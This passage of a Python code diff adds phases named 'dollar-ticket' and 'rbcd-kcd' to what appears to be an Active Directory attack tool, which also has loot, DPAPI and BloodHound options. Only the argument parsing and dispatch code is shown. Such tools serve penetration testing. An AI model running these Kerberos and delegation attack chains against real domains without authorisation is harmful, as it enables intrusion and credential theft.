     run_opts.add_argument("--dry-run", action="store_true", help="Print commands only")
@@ -7902,6 +8283,7 @@ def parse_args() -> Config:
         machine_password=args.machine_password,
         alt_spn=args.alt_spn,
         in_ccache=args.in_ccache,
+        target_user=args.target_user,
         no_dpapi=args.no_dpapi,
         no_bloodhound=args.no_bloodhound,
         no_bh_auto_action=args.no_bh_auto_action,
@@ -8094,6 +8476,18 @@ def main():
                     log.error("--phase loot requires credentials (-u/-p)")
                     sys.exit(1)
                 run_loot(cfg)
+
+            case "dollar-ticket":
+                if not cfg.has_creds:
+                    log.error("--phase dollar-ticket requires credentials (-u/-p)")
+                    sys.exit(1)
+                run_dollar_ticket(cfg)
+
+            case "rbcd-kcd":
+                if not cfg.has_creds:
+                    log.error("--phase rbcd-kcd requires credentials (-u/-p)")
+                    sys.exit(1)
+                run_rbcd_kcd_chain(cfg)
 
             case "discover":
                 # Zero-auth: no -u/-p needed, but cfg.dc_ip + cfg.domain
